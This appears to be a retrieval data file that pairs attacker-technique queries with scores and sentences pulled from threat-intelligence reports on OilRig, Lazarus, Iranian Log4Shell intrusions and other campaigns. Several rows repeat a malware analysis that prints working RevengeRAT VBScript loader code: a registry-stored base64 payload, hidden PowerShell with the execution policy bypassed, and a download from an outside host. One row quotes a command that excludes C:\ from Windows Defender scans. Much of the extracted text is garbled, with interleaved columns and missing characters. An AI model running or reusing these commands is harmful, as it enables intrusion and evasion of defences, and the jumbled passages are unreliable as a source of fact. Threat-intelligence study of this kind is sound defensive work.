and lateral movement/execution of files|0.7892007231364451|['The trillions of signals we analyze Scope and scale of Dismantling Addressing dramatically increased the impact of their actions.', 'from our worldwide ecosystem of products and threat landscape cybercrime vulnerabilities While Russia drove headlines, Iranian actors services reveal the ferocity, scope, and scale The volume of password To date, Microsoft 93% of our ransomware escalated their attacks following a transition of digital threats across the globe.', 'Microsoft is attacks has risen to an removed more than incident response of presidential power, launching destructive taking action to defend our customers and estimated 921 attacks 10,000 domains used engagements revealed attacks targeting Israel, and ransomware and the digital ecosystem against these threats, every second a 74% by cybercriminals and insufficient controls hack-and-leak operations targeting critical and you can read about our technology that increase in just one year.', '600 used by nation on privilege access and infrastructure in the United States.', 'China also identifies and blocks billions of phishing state actors.', 'lateral movement.', 'increased its espionage efforts in Southeast attempts, identity thefts, and other threats to Asia and elsewhere in the global south, seeking our customers.', 'to counter US influence and steal critical data and information.RReeppoorrtt The State of Nation State Devices and Cyber Influence Cyber Contributing 03 Microsoft Digital Defense Report 2022 IInnttrroodduuccttiioonn Cybercrime Threats Infrastructure Operations Resilience Teams Introduction by Tom Burt The state of cybercrime Nation state threats Continued Cybercriminals continue to act as sophisticated Nation state actors are launching increasingly profit enterprises.', 'Attackers are adapting and sophisticated cyberattacks designed to evade We also use legal and technical means to finding new ways to implement their techniques, detection and further their strategic priorities.', 'seize and shut down infrastructure used by increasing the complexity of how and where The advent of cyberweapon deployment in cybercriminals and nation state actors and notify they host campaign operation infrastructure.', 'the hybrid war in Ukraine is the dawn of a new customers when they are being threatened At the same time, cybercriminals are becoming age of conflict.']
and lateral movement/execution of files|0.7892007231364451|['HTTP/S but included a secondary method, DNS tunneling, which does not function properly.', 'Shark DanBot, Shark, and Milan use both DNS, a commonality for OilRig backdoors, and HTTP/S, for net- has similar symptoms, where its primary communication method uses DNS but has a non-functional work communications with C&C servers.', 'Marlin, however, in a significant departure from typical OilRig HTTP/S secondary option.', 'In a similar vein, the SMB lateral movement tool, when it attempts to de- tactics, techniques, and procedures, uses the OneDrive API for its C&C operations.', 'Post-compromise termine a remote systems vulnerability to EternalBlue, uses a hard-coded private IP address that is activities include data collection (via browser-data theft, and a keylogger) and exfiltration, and also unlikely to ever identify a vulnerable system (unless that system has that specific private IP address).', 'lateral movement.', 'Another telltale sign of OilRig is the creation and use of multiple folders in a backdoors working Victims of the campaign include diplomatic organizations, technology companies, and medical directory that are used for uploading to, and downloading files from, the OilRig C&C server.', 'First organizations in Israel, Tunisia, and the United Arab Emirates (UAE).', 'documented in the ALMA backdoor [24], we see DanBot, Shark, and Milan employing the same methodology.', 'We rarely see similar TTPs from other groups.', 'ESET researchers observed two methods for initial access: spearphishing and via the remote administration software ITbrain [19], which was found in conjunction with the remote access tool Lastly, OilRig operators are well known for using DNS as a C&C communication channel, while also TeamViewer.']
batch file|0.7627503885238869|"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications.', '4.', 'Sandman (China) - Sandman APT is likely associated with suspected China-based threat clusters known to use the KEYPLUG backdoor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-0866/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's toolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing collective efforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many commodity loaders were poly- morphic (change their hash on every execution) and supported attackers' hands-on-keyboard activities for information gathering, disabling security settings, and forging the way for ransomware attacks.""]"
contains the “whoami” command|0.7830086878252308|['Nomadic Octopus Paperbug CampaignTLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glossary 3 2 Introduction 3 3 ExecutiveSummary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']
executed by rundll32.exe.|0.8117699397940845|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
executed by rundll32.exe.|0.8117699397940845|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
executed by rundll32.exe.|0.8117699397940845|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
executed by rundll32.exe.|0.8117699397940845|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
execute it with rundll32.exe|0.7815534382903446|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
execute it with rundll32.exe|0.7815534382903446|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
execute it with rundll32.exe|0.7815534382903446|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
execute it with rundll32.exe|0.7815534382903446|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
then deletes the registry key|0.7549700382539604|['First, the code that generates the file can be found in other Lazarus Group malware families and constitutes nearly 77% of the non-C .cab RunTime (CRT) library functions within the WhiskeyBravo-One executable.', 'Secondly, the end result is that the destruc- tion operation can give the impression that the original selected file is recoverable if the user is able to crack the archives password.', 'This is a bit of a cruel joke to play on the victim by giving them a glimmer of hope when, in actuality, the file is most definitely destroyed and attempting to recover the file via the archive would be fruitless and a waste of resources.', 'Operation Blockbuster: 19 Destructive Malware Report3.2 WhiskeyBravoTwo WhiskeyBravo-Two is a simplified variant of WhiskeyBravo-One that removes the functionality from the dnsec.dat activation window determination code as well as the archive functionality from the file destruction code.', 'WhiskeyBravo-Two expects the operation configuration file to be located at instead of .', '.', '%SYSDIR%\\\\TYEI08.DEP %SYSDIR%\\\\noise03dat The file destruction process within WhiskeyBravo-Two focuses solely on overwriting the contents of a file and ignores the task of deleting the file.', 'This results in any file marked for destruction remaining on the victims file system, with the same file size, but with completely useless content.', 'Furthermore, WhiskeyBravo-Two removes the generation entirely.', 'The .cab removal of the generation, and the functions necessary for that operation, results in a significantly smaller binary .cab footprint that consists of a total of 21 functions, 8 of which are made of the CRT library and 3 are administrative overhead (service related), leaving 10 functions responsible for the destructive functionality of the malware.', 'Operation Blockbuster: 20 Destructive Malware Report4.']
enumerate files and folders|0.7559291058249211|"['Nodachi: A previously unknown set of plugins uti- lized by SideCopy were calling Nodachi.', 'These Golang-based plugins have reconnaissance and file-stealing abilities targeting an Indian multi-factor authentication app known as Kavach.', 'RAT ANALYSIS CETARAT CetaRAT is a C#-based RAT family first seen in the wild since 2019.', 'Its malicious capabilities (Figure 8) include: Execution: Download and run arbitrary executables and commands.', 'Figure 8: CetaRAT command codes.', 'File management: Upload, download, delete, rename and enumerate files.', 'Capture: Take screenshots and monitor clipboard data.', 'Processes: List or kill processes on the endpoint.', '2021 Cisco.', 'All rights reserved.', 'talos-external@cisco.com | talosintelligence.com page 9 of 23InSideCopy: How this APT continues to evolve its arsenal DETARAT DetaRAT is a previously unknown C#-based implant used by SideCopy.']"
the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization’s unpatched VMware Horizon server|0.881491011406319|"['CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise.', 'As trusted-third party reporting associated Log4Shell activity from 51.89.181[.', ']64 with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organizations DC.', 'From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software.', 'The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies.', 'Threat Actor Activity In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organizations unpatched VMware Horizon server.', 'As part of their initial exploitation, CISA observed a connection to known malicious IP address 182.54.217[.', ']2 lasting 17.6 seconds.', 'The actors exploit payload ran the following PowerShell command [T1059.001] that added an exclusion tool to Windows Defender [T1562.001]: powershell try{AddMpPreference ExclusionPath \'C:\\\\\'; WriteHost \'added exclusion\'} catch {WriteHost \'addingexclusionfailed\' }; powershell enc ""$BASE64 encoded payload to download next stage and execute it"" Page 2 o f 14 | Product ID: AA22-320A TLP:CLEARTLP:CLEAR CISA | FBI `` The exclusion tool allowlisted the entire c:\\\\drive, enabling threat actors to download tools to the c:\\\\drive without virus scans.', 'The exploit payload then downloaded mdeploy.text from 182.54.217[.', ']2/mdepoy.txt to C:\\\\users\\\\public\\\\mde.ps1 [T1105].']"
The Scheduled Task was named RuntimeBrokerService.exe|0.8372872386148322|['file.zip contained XMRig cryptocurrency mining software and associated configuration files.', 'WinRing0x64.sys XMRig Miner driver wuacltservice.exe XMRig Miner config.json XMRig miner configuration RuntimeBroker.exe Associated file.', 'This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001].', 'The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.', 'The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.', 'See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.', 'After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server associated with 144.76.136[.]153.', 'The actors downloaded the following tools: PsExec a Microsoft signed tool for system administrators.']
created a Scheduled Task|0.8499945019454129|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
created a Scheduled Task|0.7588435079389287|['The files created in this directory are shown in the screenshot below (Figure 2).', 'Figure 2.', 'Screenshot showing files dropped by the MSI The task is executed at log on for any user.', 'Its purpose is to execute another legitimate executable (CameraSettingsUIHost.exe) with two arguments (18e190413af045db88dfbd29609eb877 and lion).', 'CameraSettingsUIHost.exe is a Microsoft file that assists with usage of a webcam on the system.', 'The created scheduled task can be seen in Figure 3.', '2/11Figure 3.', 'Malicious scheduled task created by the malware It is in CameraSettingsUIHost.exe that the novel DLL side-loading occurs.', 'Novel DLL Side-loading Technique Conventional DLL Side-Loading As a quick primer, when an executable attempts to load a library (DLL) in Windows, it will look for this library in a set order of locations.', 'This process is documented by Microsoft here.', 'Therefore, by placing a malicious DLL in the same folder as the calling application, an attacker can ensure it is loaded before a legitimate DLL of the same name in the system directory.']
created a Scheduled Task|0.7737212236902915|"['On the victims side, the execution of an implant is needed; It calls back its Local Relay and starts the TCP/SOCKS5 tunnel.', 'Figure 9.', 'Image taken from the Ligolo project documentation.', 'Comparing the new variant (Sockbot) to the original source code available online, the threat actors added several execution checks to avoid multiple instances running at the same time, defined the value of the Local Relay as a hard-coded string to avoid the need of passing command line parameters when executing the attack and set the persistence via a scheduled task (Figure 10).', 'Figure 10.', 'Scheduled Task created by the attackers.', 'Our threat intelligence team is constantly looking for clues around the usage of this tool.', 'In addition, we would like to provide the readers with a Yara rule to detect this new threat, if needed.', 'Feel free to share details with us in case you find related samples.', 'rule win_golang_tunnel_ligolo_sockbot { meta: author = ""Felipe Duarte, Security Joes"" description = ""Detects Go binary Sockbot"" hash = ""7dc13eae4e15869024ec1fd2650e4f8444d53dfa2dd7d302f845cd94289fe5f2"" strings: $str1 = ""main.handleRelay"" $str2 = ""main.verifyTlsCertificate"" $str3 = ""main.FindProcess"" $str4 = ""main.hideConsole"" $str5 = ""main.startSocksProxy"" $str6 = ""main.CreateSchedTask"" $str7 = ""main.relay"" $str8 = ""Connecting to relay server..."" $str9 = ""Could not start SOCKS5 proxy !""', 'condition: uint16(0) == 0x5A4D and all of them Threat Intelligence & Incident Response TeamSockbot in GoLand Linking APT Groups with Ransomware Gangs } The sample found during the intrusion has the value 45.61.138[.']"
created a Scheduled Task|0.817277271265445|['The script will initially confirm an internet connection using WMIs Win32_PingStatus class to ping https://www.google[.]com.', 'If successful, it will run a batch file named 8lGghf8kIPIuu3cM.bat.', 'The main task of the batch file 8lGghf8kIPIuu3cM.bat is to drop files that will further unpack and create a scheduled task for the payload.', 'The batch file will create more scripts that will carry out these subtasks: unz.vbs is used for decompressing the executable out from the archive into the same directory unzFile.vbs creates unz.vbs 2L7uuZQboJBhTERK.bat is just for chaining; runs unzFile.vbs then runs 2BYretPBD4iSQKYS.bat 2BYretPBD4iSQKYS.bat is just for chaining; runs unz.vbs then runs d.bat d.bat creates a scheduled task of the unpacked payload (conhost.exe) then runs e.bat e.bat deletes itself and the other scripts created by 8lGghf8kIPIuu3cM.bat The batch file named d.bat creates a scheduled task to attain another persistent execution of the malware on the target machine.', 'The scheduled task is named ConsoleHostManager as seen in the below screenshot.', 'Screenshot for Scheduled Task created.', 'Netskope Detection Netskope Advanced Threat Protection provides proactive coverage against zero-day and APT samples of malicious Office documents using both our static analysis engines and cloud sandbox.', 'The following screenshot shows the detection for e2a3edc708016316477228de885f0c39, indicating it was detected by Netskope Cloud Sandbox, Netskope Advanced Heuristic Engine, and Netskope Threat Intelligence.', '7/8Conclusions Malware written in uncommon programming languages puts the security community at a disadvantage as researchers and reverse engineers unfamiliarity can hamper their investigation.', 'Nim is one of the young programming languages increasingly abused by malware authors.', 'Aside from its familiar syntax, its cross-compilation features allow attackers to write one malware variant and have it cross-compiled to target different platforms.']
Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain|0.85440428964931|['After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server associated with 144.76.136[.]153.', 'The actors downloaded the following tools: PsExec a Microsoft signed tool for system administrators.', 'Mimikatz a credential theft tool.', 'Ngrok a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002].', 'Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.']
